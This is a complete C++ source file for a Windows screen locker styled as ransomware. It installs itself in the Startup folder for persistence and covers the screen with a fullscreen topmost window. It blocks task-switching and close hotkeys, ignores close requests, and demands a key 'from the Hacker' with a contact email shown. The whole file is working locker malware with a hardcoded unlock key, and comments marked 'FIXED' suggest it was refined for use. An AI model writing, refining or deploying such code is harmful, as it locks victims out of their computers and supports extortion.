#include <windows.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <gdiplus.h>
#include <shlwapi.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "uuid.lib")

const wchar_t CORRECT_KEY[] = L"1234567";
const wchar_t WINDOW_CLASS[] = L"UltraFastLocker";
const wchar_t TITLE[] = L"System Lock";

HWND hEdit = NULL;
HBITMAP hBitmap = NULL;
int screenW, screenH;

HBITMAP LoadImageFast(const wchar_t* filename) {
    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromFile(filename);
    if (!bitmap) return NULL;
    HBITMAP hbm = NULL;
    bitmap->GetHBITMAP(Gdiplus::Color(255, 0, 0), &hbm);
    delete bitmap;
    return hbm;
}

void CreateStartupShortcut() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    wchar_t startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    wchar_t shortcutPath[MAX_PATH];
    swprintf(shortcutPath, L"%s\\SystemLock.lnk", startupPath);  // FIXED: swprintf instead of swprintf_s
    if (GetFileAttributesW(shortcutPath) != INVALID_FILE_ATTRIBUTES) return;
    
    CoInitialize(NULL);
    IShellLinkW* pShellLink = NULL;
    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&pShellLink);
    if (pShellLink) {
        pShellLink->SetPath(exePath);
        pShellLink->SetWorkingDirectory(exePath);
        IPersistFile* pPersistFile = NULL;
        pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
        if (pPersistFile) {
            pPersistFile->Save(shortcutPath, TRUE);
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
}

void PlayErrorSound() {
    MessageBeep(MB_ICONERROR);
    Beep(1000, 300);
}

bool CheckKey() {
    wchar_t buffer[32];
    GetWindowTextW(hEdit, buffer, 32);
    return wcscmp(buffer, CORRECT_KEY) == 0;
}

void BlockInput() {
    RegisterHotKey(NULL, 1, MOD_ALT, VK_TAB);
    RegisterHotKey(NULL, 2, MOD_WIN, 0);
    RegisterHotKey(NULL, 3, MOD_ALT, VK_F4);
    RegisterHotKey(NULL, 4, MOD_CONTROL, VK_ESCAPE);
    RegisterHotKey(NULL, 5, MOD_ALT, VK_ESCAPE);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            hEdit = CreateWindowW(L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | WS_BORDER | ES_PASSWORD | ES_CENTER,
                screenW/2 - 150, screenH/2 - 100, 300, 40,
                hwnd, (HMENU)1, NULL, NULL);
            
            HFONT hFont = CreateFontW(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Segoe UI");
            SendMessageW(hEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
            SetFocus(hEdit);
            
            HWND hBtn = CreateWindowW(L"BUTTON", L"Enter the System",
                WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                screenW/2 - 100, screenH/2 - 40, 200, 40,
                hwnd, (HMENU)2, NULL, NULL);
            SendMessageW(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            wchar_t imgPath[MAX_PATH];
            GetModuleFileNameW(NULL, imgPath, MAX_PATH);
            wchar_t* lastSlash = wcsrchr(imgPath, L'\\');
            if (lastSlash) {
                wcscpy_s(lastSlash + 1, MAX_PATH - (lastSlash - imgPath), L"a.png");
                hBitmap = LoadImageFast(imgPath);
            }
            
            BlockInput();
            return 0;
        }
        
        case WM_HOTKEY:
            return 0;
            
        case WM_COMMAND:
            if (LOWORD(wParam) == 2) {
                if (CheckKey()) {
                    ExitProcess(0);
                } else {
                    PlayErrorSound();
                    SetWindowTextW(hEdit, L"");
                    MessageBoxW(hwnd, L"Incorrect Key", L"Error", MB_OK | MB_ICONERROR);
                    SetFocus(hEdit);
                }
            }
            return 0;
            
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            RECT rect;
            GetClientRect(hwnd, &rect);
            HBRUSH hBrush = CreateSolidBrush(RGB(204, 0, 0));  // FIXED: Create red brush manually
            FillRect(hdc, &rect, hBrush);
            DeleteObject(hBrush);
            
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 255, 255));
            
            HFONT hTitleFont = CreateFontW(32, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
            HFONT oldFont = (HFONT)SelectObject(hdc, hTitleFont);
            
            const wchar_t* title = L"Enter The Key you got from the Hacker";
            DrawTextW(hdc, title, -1, &rect, DT_CENTER | DT_TOP | DT_NOPREFIX);
            SelectObject(hdc, oldFont);
            DeleteObject(hTitleFont);
            
            if (hBitmap) {
                HDC hdcMem = CreateCompatibleDC(hdc);
                HBITMAP oldBmp = (HBITMAP)SelectObject(hdcMem, hBitmap);
                BITMAP bm;
                GetObjectW(hBitmap, sizeof(bm), &bm);
                int imgX = screenW/2 - bm.bmWidth/2;
                int imgY = screenH/2 + 50;
                BitBlt(hdc, imgX, imgY, bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
                SelectObject(hdcMem, oldBmp);
                DeleteDC(hdcMem);
            }
            
            HFONT hEmailFont = CreateFontW(20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
                CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
            oldFont = (HFONT)SelectObject(hdc, hEmailFont);
            rect.top = screenH - 100;
            const wchar_t* email = L"hacker@gmail.com";
            DrawTextW(hdc, email, -1, &rect, DT_CENTER | DT_TOP | DT_NOPREFIX);
            SelectObject(hdc, oldFont);
            DeleteObject(hEmailFont);
            
            EndPaint(hwnd, &ps);
            return 0;
        }
            
        case WM_CLOSE:
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
            
        case WM_SYSKEYDOWN:
        case WM_SYSKEYUP:
            if (wParam == VK_F4 || wParam == VK_TAB || wParam == VK_ESCAPE)
                return 0;
            break;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    CreateStartupShortcut();
    
    screenW = GetSystemMetrics(SM_CXSCREEN);
    screenH = GetSystemMetrics(SM_CYSCREEN);
    
    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(RGB(204, 0, 0));  // FIXED: Create brush instead of RED_BRUSH
    wc.lpszClassName = WINDOW_CLASS;
    RegisterClassExW(&wc);
    
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        WINDOW_CLASS, TITLE,
        WS_POPUP | WS_VISIBLE,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );
    
    SetForegroundWindow(hwnd);
    SetActiveWindow(hwnd);
    SetFocus(hwnd);
    
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return (int)msg.wParam;
}
